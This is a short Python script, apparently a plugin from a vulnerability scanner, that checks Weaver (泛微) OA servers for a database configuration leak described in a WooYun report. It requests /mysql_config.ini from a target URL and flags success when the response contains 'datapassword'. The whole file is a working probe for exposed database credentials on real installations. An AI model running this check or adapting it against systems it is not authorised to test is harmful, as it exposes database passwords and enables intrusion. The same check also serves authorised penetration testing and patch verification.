#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA 数据库配置泄露
referer: http://www.loner.fm/bugs/bug_detail.php?wybug_id=wooyun-2014-087500
author: Lucifer
description: mysql_config.ini泄露。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class weaver_oa_db_disclosure:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/mysql_config.ini"
        vulnurl = self.url + payload

        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"datapassword" in req.text:
                printGreen("[+]Success:存在泛微OA 数据库配置泄露漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在weaver_oa_db_disclosure漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = weaver_oa_db_disclosure(sys.argv[1])
    testVuln.run()